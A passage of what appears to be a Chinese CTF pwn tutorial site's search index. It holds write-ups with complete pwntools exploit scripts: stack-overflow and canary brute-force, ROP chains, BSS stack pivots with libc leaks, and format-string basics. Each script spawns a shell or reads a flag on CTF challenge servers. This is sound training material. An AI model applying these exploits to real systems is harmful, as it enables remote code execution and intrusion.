0x00000000004c10e0) # @ .data\n  p += pack('&lt;Q', 0x000000000040f23e) # pop rsi ; ret p += pack('&lt;Q', 0x00000000004c10e8) # @ .data + 8\n  p += pack('&lt;Q', 0x00000000004017cf) # pop rdx ; ret p += pack('&lt;Q', 0x00000000004c10e8) # @ .data + 8\n  p += pack('&lt;Q', 0x00000000004493d7) # p += p64(59)\n  p += pack('&lt;Q', 0x00000000004012d3) # syscall\n  return p\n\nmyrop = sh()\nprint(hex(len(myrop)))\n\ncanary = b'\\x00'\npadding = b'a' * (0x110-0x8) \n\nfor i in range(7):\n  for j in range(0x100): \n    try:\n      payload = padding + canary + p8(j)\n      p.sendafter(b'input:\\n',payload)\n\n      strs = p.recvuntil(b'*** stack smashing detected ***',timeout=1) \n\n      if(b'stack' not in strs):\n        print(i+1,'--',hex(j)) \n        canary += p8(j)\n        break \n    except:\n      pass\n\n# gdb.attach(p,'b* 0x401DA3')\nprint('down----')\n\npayload = padding + canary + p64(0xdeadbeef) + myrop\nprint(hex(len(payload)))\n\np.recvuntil('please input:')\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-21/","title":"call_read \u8fc1\u79fb\u5230 BSS \u6bb5","text":""},{"location":"Pwn/Chapter1/1-21/#call_read-\u8fc1\u79fb\u5230-bss-\u6bb5","title":"call_read \u8fc1\u79fb\u5230 BSS \u6bb5","text":"<p>\u660e\u663e\u5b58\u5728\u6808\u6ea2\u51fa</p> <p></p> <p>\u4f46\u662f\u53ef\u5229\u7528\u957f\u5ea6\u4e0d\u591f\uff0c\u8003\u8651\u6808\u8fc1\u79fb</p> <p></p> <p>\u5de6\u8fb9\u6709\u7ed9\u51fa <code>read</code> \u51fd\u6570</p> <p></p> <p>\u4f7f\u7528 <code>call_read</code> + \u6808\u8fc1\u79fb\u6253\u6cd5</p> <pre><code># \u5199\u5165 call_read \u7684\u5730\u5740\uff0c\u4f7f\u51fd\u6570 main \u6216\u89e6\u53d1\u6ea2\u51fa\u7684\u51fd\u6570\u8fd4\u56de\u65f6\u8df3\u8f6c\u5230 read\uff0c\u4ece\u800c\u5728 .bss \u5904\u8bfb\u53d6\u540e\u7eed\u6570\u636e\npayload = b'a' * 0x100 + p64(bss) + p64(call_read)\np.send(payload)\n</code></pre> <p>\u5728 <code>.bss</code> \u4e2d\u6784\u9020\u7b2c\u4e8c\u9636\u6bb5 ROP \u94fe</p> <pre><code># \u7b2c\u4e00\u6761 p64(bss_next) \u5c06\u65b0\u7684\u6808\u5e95\u6307\u5411 .bss+0x500\uff0c\u4e3a\u63a5\u4e0b\u6765\u7684\u94fe\u7559\u7a7a\u95f4\npayload  = p64(bss_next)\n\n# \u8c03\u7528 puts(puts_got) \u6cc4\u9732 libc \u4e2d puts \u7684\u5b9e\u9645\u5730\u5740\npayload += p64(rdi_ret) + p64(puts_got) + p64(puts_plt)\n\n# \u8c03\u7528 read\uff0c\u5c06\u5728 .bss+0x500 \u5904\u7ee7\u7eed\u5199\u5165\u6700\u7ec8 ROP\npayload += p64(call_read)\n\n# \u586b\u5145\u5230 0x100\npayload = payload.ljust(0x100, b'\\x00')\n\n# \u6700\u540e\u5199\u5165 (old_RBP, leave_ret)\uff0c\u5f53\u51fd\u6570\u8fd4\u56de\u65f6\u6267\u884c leave; ret\npayload += p64(bss - 0x100) + p64(leave_ret)\np.send(payload)\n</code></pre> <p>\u8ba1\u7b97 libc \u57fa\u5740\u4e0e\u6784\u9020\u6700\u7ec8 ROP</p> <pre><code>libc_add  = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nlibcbase  = libc_add - libc.sym['puts']\nsystem    = libcbase + libc.symbols['system']\nstr_bin_sh= libcbase + next(libc.search(b'/bin/sh'))\n</code></pre> <p>\u8c03\u7528 system \u62ff shell</p> <pre><code>payload = p64(rdi_ret) + p64(str_bin_sh) + p64(system)\npayload = payload.ljust(0x100, b'\\x00')\n\n# \u4e0e\u7b2c\u4e8c\u9636\u6bb5\u76f8\u4f3c\uff0c\u6784\u9020\u65b0\u7684 RBP \u548c leave; ret\uff0c\u5c06\u6808\u6307\u5411\u8be5 payload \u5e76\u6267\u884c\uff0c\u5b8c\u6210\u6700\u7ec8\u8c03\u7528\npayload += p64(bss_next - 0x100 - 0x8) + p64(leave_ret)\np.send(payload)\n\np.interactive()\n</code></pre> <p>\u5b8c\u6574 payload</p> <pre><code>from pwn import *\nfrom LibcSearcher import *\n\np = remote('challenge.qsnctf.com', 30473)\nFILENAME = './pwn5'\nlibc = ELF('./libc-2.31.so')\n\n# First stage: stack pivot to BSS\ncall_read = 0x40119B\nbss = 0x404340\npayload = b'a' * (0x100) + p64(bss) + p64(call_read)\np.send(payload)\n\n# Second stage: leak libc address\nrdi_ret = 0x0000000000401210\nret = 0x000000000040101a\nleave_ret = 0x00000000004011be\nputs_plt = 0x401064\nputs_got = 0x404018\nbss_next = bss + 0x500\n\npayload = p64(bss_next) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(call_read)\npayload = payload.ljust(0x100, b'\\x00')\npayload += p64(bss - 0x100) + p64(leave_ret)\n\np.send(payload)\n\n# Calculate libc base address\nlibc_add = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))\nlibcbase = libc_add - libc.sym['puts']\nsystem = libcbase + libc.symbols['system']\nstr_bin_sh = libcbase + next(libc.search(b'/bin/sh'))\nsuccess('libcbase ' + hex(libcbase))\n\n# Final stage: get shell\npayload = p64(rdi_ret) + p64(str_bin_sh) + p64(system)\npayload = payload.ljust(0x100, b'\\x00')\npayload += p64(bss_next - 0x100 - 0x8) + p64(leave_ret)\np.send(payload)\n\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter1/1-22/","title":"Gets \u6808\u6ea2\u51fa\uff08BackDoor \u6307\u4ee4\uff09","text":""},{"location":"Pwn/Chapter1/1-22/#gets-\u6808\u6ea2\u51fabackdoor-\u6307\u4ee4","title":"Gets \u6808\u6ea2\u51fa\uff08BackDoor \u6307\u4ee4\uff09","text":"<p>IDA \u5206\u6790\u53d1\u73b0\u6808\u6ea2\u51fa</p> <p></p> <p>\u53d1\u73b0\u6709\u5229\u7528 <code>system(\"/bin/sh\")</code>\uff0c\u4f46\u662f\u5728\u51fd\u6570\u5185\u90e8</p> <p></p> <p>\u5728\u6c47\u7f16\u89c6\u56fe\u53ef\u4ee5\u770b\u5230\u76f8\u5173\u7684\u4e24\u6761\u6307\u4ee4</p> <p></p> <p>\u62ff\u5230\u5177\u4f53\u5730\u5740</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote(\"challenge-9f7798f5939d9729.sandbox.ctfhub.com\", 27233)\n\npayload = b'a' * 120 + p64(0x04007B8)\np.sendline(payload)\np.interactive()\n</code></pre> <p></p>"},{"location":"Pwn/Chapter1/1-3/","title":"Gets \u6808\u6ea2\u51fa\uff08\u53d8\u91cf\u8986\u76d6\uff09","text":""},{"location":"Pwn/Chapter1/1-3/#gets-\u6808\u6ea2\u51fa\u53d8\u91cf\u8986\u76d6","title":"Gets \u6808\u6ea2\u51fa\uff08\u53d8\u91cf\u8986\u76d6\uff09","text":"<p>IDA64 \u53cd\u7f16\u8bd1</p> <p></p> <p>\u8ffd\u8e2a\u770b\u5230 gets</p> <p></p> <p>v1 \u7684\u4e0b\u9762\u5c31\u662f v2\uff0c\u901a\u8fc7\u6ea2\u51fa\u6539\u4e3a v2 \u7684\u503c\u4f7f\u6761\u4ef6\u6210\u7acb</p> <p></p> <p>\u6ce8\u610f\uff1a\u6d6e\u70b9\u6570\u8981\u8f6c\u5341\u516d\u8fdb\u5236</p> <pre><code>from pwn import *\n\np = remote(\"node5.buuoj.cn\", 29455)\n\npayload = b'a' * 44 + p64(0x41348000)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-4/","title":"Gets \u6808\u6ea2\u51fa\uff0832 \u4f4d\u7a0b\u5e8f\u8fd4\u56de\uff09","text":""},{"location":"Pwn/Chapter1/1-4/#gets-\u6808\u6ea2\u51fa32-\u4f4d\u7a0b\u5e8f\u8fd4\u56de","title":"Gets \u6808\u6ea2\u51fa\uff0832 \u4f4d\u7a0b\u5e8f\u8fd4\u56de\uff09","text":"<p>\u5728\u5de6\u8fb9\u770b\u5230\u6709\u4e00\u4e2a get_flag \u51fd\u6570\uff0c\u8fdb\u53bb\u770b\u770b</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230 if \u6761\u4ef6\u6210\u7acb\u540e\u5c31\u80fd\u8bfb\u53d6 flag \u4e86</p> <p>\u56de\u5934\u53bb\u770b v4 \u7f13\u5b58\u533a\u7684\u6808\u60c5\u51b5</p> <p></p> <p>\u9996\u5148\u586b\u5145 56 \u4e2a\u5b57\u8282\u5783\u573e\u6570\u636e</p> <p>argc \u5c31\u662f a1\uff0cargv \u5c31\u662f a2</p> <p></p> <p>\u6ce8\u610f\u7684\u4e00\u70b9\u662f\u83b7\u53d6 flag \u65b9\u5f0f\u662f\u6253\u5f00\u6587\u4ef6\u8bfb\u53d6</p> <p>\u5982\u679c\u4f60\u975e\u6b63\u5e38\u9000\u51fa\u662f\u6ca1\u6709\u8f93\u51fa\u7684</p> <p>\u6211\u4eec\u9700\u8981\u5229\u7528 exit \u51fd\u6570</p> <p>\u5728\u51fd\u6570\u8868\u4e2d\u5173\u952e\u5b57\u5b9a\u4f4d\u627e\u5230 exit \u7684\u8d77\u59cb\u4f4d\u7f6e</p> <p></p> <p>\u8c03\u7528\u51fd\u6570\u8fd8\u9700\u8981\u4f20\u5165\u4e24\u4e2a\u53c2\u6570</p> <p>32 \u4f4d\u7a0b\u5e8f\u662f\u8fd4\u56de\u5730\u5740\u5728\u53c2\u6570\u524d\u9762</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',27494)\n\nget_flag_addr = 0x080489A0\nexit_addr = 0x804E6A0\na1 = 0x308CD64F\na2 = 0x195719D1\n\npayload = b'a' * 56 + p32(get_flag_addr) + p32(exit_addr) + p32(a1) + p32(a2)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-5/","title":"Read \u6808\u6ea2\u51fa","text":""},{"location":"Pwn/Chapter1/1-5/#read-\u6808\u6ea2\u51fa","title":"Read \u6808\u6ea2\u51fa","text":"<p>\u653e\u5165 64 \u4f4d IDA \u4e2d\u53cd\u7f16\u8bd1</p> <p>\u6ce8\u610f\u770b read \u51fd\u6570\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u5b83\u51b3\u5b9a\u6211\u4eec\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u800c\u8fd9\u4e2a\u5730\u5740\u662f\u7531 scan \u51b3\u5b9a\u7684</p> <p>\u4e5f\u5c31\u662f\u8bf4\u957f\u5ea6\u662f\u6211\u4eec\u53ef\u63a7\u5236\u7684</p> <p></p> <p>\u770b\u5185\u5b58\u53ef\u4ee5\u770b\u5230\u79bb ret \u5dee 24 \u4e2a\u5b57\u8282</p> <p>dq \u5360 8 \u4e2a\u5b57\u8282</p> <p></p> <p>\u627e\u5230\u540e\u95e8\u51fd\u6570</p> <p></p> <p>\u5982\u679c\u770b\u4e0d\u5230\u5730\u5740\u5f80\u524d\u62c9\u4e00\u4e0b\uff0cStar \u5c31\u662f\u8d77\u59cb\u5730\u5740</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',27664)\n\npayload = b'a' * 24 + p64(0x04006E6)\n\np.recv()\np.sendline('100')\np.recv()\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-6/","title":"32 \u4f4d ROP","text":""},{"location":"Pwn/Chapter1/1-6/#32-\u4f4d-rop","title":"32 \u4f4d ROP","text":"<p>32\u4f4d IDA \u53cd\u7f16\u8bd1</p> <p></p> <p>\u554a\u54c8\uff0c\u4e00\u773c\u5b58\u5728\u6808\u6ea2\u51fa</p> <p></p> <p>\u67e5\u770b\u5185\u5b58\u9700 140 \u4e2a\u5b57\u8282\u8986\u76d6</p> <p></p> <p>Shift + F12 \u67e5\u770b\u5b57\u7b26\u4e32\uff0c\u6709\u53ef\u5229\u7528\u51fd\u6570\u4e0e\u5b57\u7b26\u4e32\uff0c\u6784\u9020 ROP</p> <p></p> <p>\u5728 plt \u8868\u4e2d\u62ff\u5230 system \u5730\u5740</p> <p></p> <p>32 \u4f4d\u4e2d\u8c03\u7528 system \u51fd\u6570\u65f6\u9700\u8981\u4f20\u5165\u4e00\u4e2a\u5c06\u6765\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u4e2a\u8fd4\u56de\u5730\u5740\u968f\u610f\uff0c\u4f46\u5fc5\u987b\u8981\u6709\uff0c\u8fd4\u56de\u5730\u5740\u540e\u9762\u5219\u662f\u53c2\u6570</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',29920)\n\nbinsh = 0x0804a024\nsystem = 0x08048320\n\np.recvuntil('Input:\\n')\n\npayload = b'a' * 140 + p32(system) + p32(0) + p32(binsh)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-7/","title":"64 \u4f4d ROP","text":""},{"location":"Pwn/Chapter1/1-7/#64-\u4f4d-rop","title":"64 \u4f4d ROP","text":"<p>\u6254\u8fdb IDA64 \u4e2d\u53cd\u7f16\u8bd1\uff0c\u53d1\u73b0\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u8fdb\u53bb\u770b\u770b</p> <p></p> <p>\u7f13\u5b58\u533a buf \u5927\u5c0f\u5c45\u7136\u4e3a 200\uff0c\u80af\u5b9a\u5b58\u5728\u6ea2\u51fa</p> <p></p> <p>\u53cc\u51fb buf \u53ef\u4ee5\u7b97\u51fa\u9700\u8981 136 \u4e2a\u5b57\u8282\u5783\u573e\u6570\u636e</p> <p></p> <p>\u6ca1\u6709\u7ed9\u540e\u95e8\u51fd\u6570\uff0c\u4f46\u662f\u7ed9\u4e86\u76f8\u5173\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u6784\u9020 ROP</p> <p></p> <p>64 \u4f4d\u7cfb\u7edf\u8fd8\u683c\u5916\u9700\u8981\u4e00\u4e2a <code>pop rdi; ret</code> \u6307\u4ee4\uff0c\u4f7f\u7528\u5de5\u5177 ROPgadget \u83b7\u53d6\u5176\u5730\u5740</p> <p><code>pop rdi; ret</code> \u662f\u4e00\u4e2a\u975e\u5e38\u5e38\u89c1\u7684 ROP gadget\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u5c06\u6808\u4e0a\u7684\u4e00\u4e2a\u503c\u5f39\u51fa\u5e76\u653e\u5165 rdi \u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u6267\u884c <code>ret</code> \u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a\u6307\u4ee4</p> <p></p> <p>\u6784\u9020 payload\uff0c<code>pop rdi</code> \u5728\u524d\uff0c\u53c2\u6570\u5728\u51fd\u6570\u524d\u9762</p> <p>\u5bf9\u4e8e64\u4f4d\u7684Linux\u7cfb\u7edf\uff0c\u51fd\u6570\u7684\u53c2\u6570\u662f\u8fd9\u6837\u4f20\u9012\u7684\uff1a</p> <ul> <li>rdi: \u7b2c\u4e00\u4e2a\u53c2\u6570</li> <li>rsi: \u7b2c\u4e8c\u4e2a\u53c2\u6570</li> <li>rdx: \u7b2c\u4e09\u4e2a\u53c2\u6570</li> <li>rcx: \u7b2c\u56db\u4e2a\u53c2\u6570</li> <li>r8: \u7b2c\u4e94\u4e2a\u53c2\u6570</li> <li>r9: \u7b2c\u516d\u4e2a\u53c2\u6570</li> </ul> <p>\u5982\u679c\u53c2\u6570\u4e2a\u6570\u8d85\u8fc76\u4e2a\uff0c\u90a3\u4e48\u5269\u4f59\u7684\u53c2\u6570\u4f1a\u88ab\u63a8\u5165\u6808\u4e2d</p> <pre><code>from pwn import *\n\np = remote(\"node5.buuoj.cn\",28172)\n\nbinsh = 0x0600A90\nsys_addr = 0x0400603\npop_rdi = 0x04006b3\n\npayload = b'a' * 136 + p64(pop_rdi) + p64(binsh) + p64(sys_addr)\n\np.sendline(payload)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-8/","title":"\u4ec5\u6709 sh ROP","text":""},{"location":"Pwn/Chapter1/1-8/#\u4ec5\u6709-sh-rop","title":"\u4ec5\u6709 sh ROP","text":"<p>\u53cd\u7f16\u8bd1\u4ee3\u7801\u8981\u5148\u8f93\u5165 administrator \u901a\u8fc7\u9a8c\u8bc1</p> <p>\u5176\u4e2d\u6709\u4e09\u4e2a\u9009\u9879\u4ee5\u53ca\u4e00\u4e2a\u9690\u85cf\u9009\u9879</p> <p></p> <p>\u5148\u770b\u9690\u85cf\u9009\u9879\uff0c\u5b83\u5c06 src \u503c\u7ed9\u4e86 dest \u6700\u540e\u6253\u5370</p> <p></p> <p>\u5728\u7b2c\u4e00\u4e2a\u9009\u9879\u4e2d\u53d1\u73b0\u8fd9\u4e2a src \u503c\u662f\u6709\u6211\u4eec\u51b3\u5b9a\u7684\u6700\u591a 128 \u5b57\u8282</p> <p></p> <p>\u770b dest \u7f13\u51b2\u533a\u660e\u663e\u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u540c\u65f6\u5de6\u8fb9 plt \u8868\u4e2d\u6709 system \u51fd\u6570\u53ef\u76f4\u63a5\u8c03\u7528</p> <p></p> <p>\u4f46\u662f\u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u5e76\u672a\u627e\u5230 /bin/sh</p> <p></p> <p>/bin/sh \u53c2\u6570\u53ef\u4ee5\u4f7f\u7528 sh \u4ee3\u66ff\uff0c\u4f7f\u7528\u5de5\u5177 ROPgadget \u770b\u80fd\u4e0d\u80fd\u67e5\u627e\u5230</p> <p></p> <p>\u65e2\u7136\u6709\u90a3\u5c31\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',26585)\n\nsystem = 0x080484d0\nsh = 0x080482ea\nmain = 0x08048722\n\np.recvuntil('password:')\np.sendline('administrator')\np.recvuntil('Exit\\n:')\np.sendline(str(1))\np.recvuntil('info:')\n\npayload = b'a' * 0x4c + p32(system) + p32(main) + p32(sh)\np.sendline(payload)\n\np.recvuntil('Exit\\n:')\np.sendline(str(4))\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter1/1-9/","title":"32 \u4f4d\u6808\u8fc1\u79fb ROP","text":""},{"location":"Pwn/Chapter1/1-9/#32-\u4f4d\u6808\u8fc1\u79fb-rop","title":"32 \u4f4d\u6808\u8fc1\u79fb ROP","text":"<p>\u6f0f\u6d1e\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p></p> <p>\u7f13\u51b2\u533a s \u80fd\u6784\u6210\u6ea2\u51fa\uff0c\u4f46\u662f ret \u592a\u5c0f\u4e86\u6784\u9020\u4e0d\u4e86\u5b8c\u6574\u7684 ROP</p> <p></p> <p>\u5f53\u7f13\u51b2\u533a\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u5e03\u7f6e\u5b8c\u6574\u7684 ROP \u94fe\u65f6\uff0c\u5229\u7528\u6808\u8fc1\u79fb\u6269\u5c55\u653b\u51fb\u7a7a\u95f4</p> <p>\u5728 32 \u4f4d\u4e2d\u5173\u952e\u6307\u4ee4\u662f <code>leave; ret</code> \u4e3b\u8981\u7528\u4e8e \u6539\u53d8 ESP\uff0c\u8ba9\u7a0b\u5e8f\u8df3\u8f6c\u5230\u65b0\u7684\u6808\u5730\u5740</p> <p>\u56e0\u4e3a <code>leave</code> \u4f1a \u5c06 <code>esp</code> \u8bbe\u4e3a <code>ebp</code>\uff0c\u5e76\u4e14 <code>ebp</code> \u7531\u6211\u4eec\u63a7\u5236\uff0c\u6240\u4ee5\u53ef\u4ee5\u5b9e\u73b0 \u6808\u8fc1\u79fb</p> <pre><code>mov ebp, new_stack_address  ; \u63a7\u5236 ebp\nleave                       ; esp = ebp, pop ebp\nret                         ; \u5f39\u51fa\u65b0\u7684\u8fd4\u56de\u5730\u5740\u5e76\u8df3\u8f6c\n</code></pre> <p>\u5728 nop \u5904\u4e0b\u65ad\u70b9\u8c03\u8bd5</p> <p></p> <p>ebp \u8ddd\u79bb\u6211\u4eec\u7684\u8f93\u5165\u5dee 0x38\uff0cebp - 0x38 \u5c31\u62ff\u5230\u4e86\u6211\u4eec\u53c2\u6570 s \u5728\u6808\u4e0a\u7684\u4f4d\u7f6e</p> <p></p> <p>\u7531\u4e8e\u6211\u4eec\u8981\u7528\u5230 leave;ret \u6765\u52ab\u6301\u6808\uff0c\u6240\u4ee5\u5148\u627e\u4e00\u4e0b levae;ret \u7684\u4f4d\u7f6e</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6267\u884c leave \u540e\uff0cebp \u5df2\u7ecf\u662f\u6211\u4eec\u4fee\u6539\u7684\u4e86</p> <p>\u4f46\u662f esp \u8fd8\u4e0d\u662f\uff0c\u56e0\u4e3a pop ebp \u548c esp \u6ca1\u6709\u5173\u7cfb</p> <p>\u4f46\u662f\u5982\u679c\u8fd9\u65f6\u5019\u6211\u518d\u6267\u884c\u4e00\u6b21 leave\uff0c\u90a3\u4e48\u6211\u4eec\u4e0d\u662f\u5c31\u53ef\u4ee5 mov esp,ebp\uff0c\u628a ebp \u7684\u503c\u8d4b\u503c\u7ed9 esp\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4fee\u6539 esp \u4e86</p> <p>\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u8fd4\u56de\u5730\u5740\u8981\u6539\u6210 leave_ret \u6307\u4ee4</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u65f6\u5019 ret \u6307\u4ee4\u8fd8\u6ca1\u6267\u884c\uff0c\u800c\u4e14 esp \u5df2\u7ecf\u6307\u5411\u6211\u4eec system \u7684\u5730\u5740\u4e86</p> <p>\u6709\u4e9b\u4eba\u6ce8\u610f\u5230\u4e86\uff0csystem \u5730\u5740\u4e4b\u524d\u6709\u56db\u4e2a a\uff0c\u800c\u4e14\u6211\u4eec\u4e00\u5f00\u59cb\u60f3\u8981\u8ba9\u4ed6\u4fee\u6539\u6210\u7684\u5730\u5740\u5c31\u662f 0xff83c1b0</p> <p>\u4e3a\u4ec0\u4e48\u73b0\u5728 esp \u53d8\u6210\u4e860xff83c1b4\uff0c\u56e0\u4e3a leave \u76f8\u5f53\u4e8e mov esp,ebp \u548c pop ebp \u4e24\u6761\u6307\u4ee4</p> <p>mov \u6267\u884c\u5b8c\uff0cesp \u53d8\u6210 0xff83c1b0\uff0c\u7136\u540e pop \u6267\u884c\u5b8c\uff0cesp \u53d8\u6210 0xff83c1b4\uff0cebp \u53d8\u6210\u4e86 0x61616161\uff0c\u4e5f\u5c31\u662f\u56db\u4e2a a</p> <p></p> <p></p> <p><code>printf()</code> \u51fd\u6570\u5728\u8f93\u51fa\u7684\u65f6\u5019\u9047\u5230 <code>\\0</code> \u4f1a\u505c\u6b62</p> <p>\u5982\u679c\u6211\u4eec\u5c06\u53c2\u6570 s \u5168\u90e8\u586b\u6ee1\uff0c\u8fd9\u6837\u5c31\u6ca1\u6cd5\u5728\u672b\u5c3e\u8865\u4e0a <code>\\0</code>\uff0c\u90a3\u6837\u5c31\u4f1a\u5c06 ebp \u8fde\u5e26\u7740\u8f93\u51fa</p> <pre><code>payload= b'a' * 0x27 + b'b'\n\nr.sendline(payload)\nr.recvuntil('b')\n\nebp = u32(r.recv(4))\n</code></pre> <p>\u7b2c\u4e00\u4e2a <code>'aaaa'</code> \u968f\u4fbf\u8f93\u5165\uff0c\u5982\u679c\u4e00\u5f00\u59cb\u5c06 <code>system</code> \u51fd\u6570\u5199\u7b2c\u4e00\u4e2a</p> <p>\u90a3\u4e48\u6211\u4eec\u5728\u7528 <code>leave\uff1bret</code> \u52ab\u6301\u6808\u7684\u65f6\u5019\u8981\u62ac\u9ad8 4 \u5b57\u8282</p> <p>\u63a5\u7740\u8ddf\u4e0a <code>system</code> \u51fd\u6570\u7684\u5730\u5740</p> <p>\u540e\u9762\u662f\u6267\u884c\u5b8c <code>system</code> \u51fd\u6570\u540e\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u8fb9\u4e5f\u53ef\u4ee5\u968f\u4fbf\u5199</p> <p>\u4e4b\u540e\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u662f\u6211\u4eec\u5199\u5728\u6808\u4e0a\u7684 <code>'/bin/sh'</code> \u5b57\u7b26\u4e32</p> <pre><code>payload = b'aaaa' + p32(sys) + p32(0) + p32(ebp - 0x28) + b\"/bin/sh\"\n</code></pre> <p>\u5c06 payload \u8865\u9f50\u957f\u5ea6</p> <pre><code>payload = payload.ljust(0x28,'\\x00')\n</code></pre> <p>\u6808\u52ab\u6301\uff0c\u83b7\u53d6 shell</p> <pre><code>payload += p32(ebp - 0x38) + p32(leave_ret)\n</code></pre> <pre><code>from pwn import *\n\np = remote('node5.buuoj.cn',28813)\nelf = ELF('./ciscn_2019_es_2')\nleave_ret = 0x08048562\n\np.recvline()\n\npayload1 = b'a' * 0x25 + b'b'* 3\n\np.send(payload1)\np.recvuntil('abbb')\n\nebp = u32(p.recv(4))\n\npayload2 = b'a' * 0x4 + p32(elf.plt['system']) + p32(0) + p32(ebp - 0x28) + b\"/bin/sh\"\npayload2 = payload2.ljust(0x28, b'\\x00')\n\n# p32(ebp - 0x38)\uff1a\u8986\u76d6\u6808\u4e0a\u7684 ebp\uff0c\u8c03\u6574\u6808\u6307\u9488\uff0c\u4f7f\u5176\u6307\u5411 payload2 \u7684\u8d77\u59cb\u4f4d\u7f6e\n# p32(leave_ret)\uff1a\u6267\u884c leave; ret\uff0c\u5b8c\u6210\u6808\u8fc1\u79fb\uff0c\u8fdb\u5165 ROP \u6267\u884c\npayload2 += p32(ebp - 0x38) + p32(leave_ret)\n\np.sendline(payload2)\np.interactive()\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Pwn/Chapter2/","title":"Index","text":""},{"location":"Pwn/Chapter2/#\u6f0f\u6d1e\u539f\u7406","title":"\u6f0f\u6d1e\u539f\u7406","text":"<pre><code>printf(\"Hello, %s!\\n\", user_input);\n</code></pre> <p><code>user_input</code> \u662f\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7531\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32\uff0c<code>%s</code> \u662f\u683c\u5f0f\u5316\u8bf4\u660e\u7b26\uff0c\u7528\u4e8e\u8f93\u51fa\u5b57\u7b26\u4e32</p> <p>\u7136\u800c\uff0c\u5982\u679c\u5f00\u53d1\u8005\u6ca1\u6709\u6b63\u786e\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5728\u8f93\u5165\u4e2d\u5305\u542b\u683c\u5f0f\u5316\u8bf4\u660e\u7b26\uff0c\u4f8b\u5982 <code>%x</code>\u3001<code>%n</code>\uff0c\u4ee5\u8fbe\u5230\u6cc4\u9732\u5185\u5b58\u4fe1\u606f\u6216\u4fee\u6539\u7a0b\u5e8f\u63a7\u5236\u6d41\u7684\u76ee\u7684</p>"},{"location":"Pwn/Chapter2/#\u653b\u51fb\u65b9\u5f0f","title":"\u653b\u51fb\u65b9\u5f0f","text":""},{"location":"Pwn/Chapter2/#\u4fe1\u606f\u6cc4\u9732information-disclosure","title":"\u4fe1\u606f\u6cc4\u9732\uff08Information Disclosure\uff09","text":"<p>\u901a\u8fc7 <code>%x</code>\u3001<code>%p</code> \u7b49\u683c\u5f0f\u5316\u7b26\u53f7\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u770b\u6808\u4e0a\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u6cc4\u9732\u7a0b\u5e8f\u7684\u6808\u4fe1\u606f\u3001\u53d8\u91cf\u503c\u3001\u8fd4\u56de\u5730\u5740\u7b49\u654f\u611f\u6570\u636e</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>printf(user_input);  // \u5982\u679cuser_input\u4e2d\u5305\u542b\"%x %x %x %x\"\uff0c\u53ef\u80fd\u6cc4\u9732\u6808\u4e0a\u7684\u6570\u636e\n</code></pre> <p>\u6b64\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u6808\u4e2d\u7684\u6570\u636e\uff08\u5982\u8fd4\u56de\u5730\u5740\u3001\u51fd\u6570\u53c2\u6570\u7b49\uff09\u4ee5\u5341\u516d\u8fdb\u5236\u7684\u5f62\u5f0f\u6253\u5370\u51fa\u6765</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u4e00\u6b65\u5206\u6790\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u6216\u627e\u5230\u6f5c\u5728\u7684\u6f0f\u6d1e\u70b9</p>"},{"location":"Pwn/Chapter2/#\u6808\u7834\u574fstack-smashing","title":"\u6808\u7834\u574f\uff08Stack Smashing\uff09","text":"<p>\u901a\u8fc7 <code>%n</code> 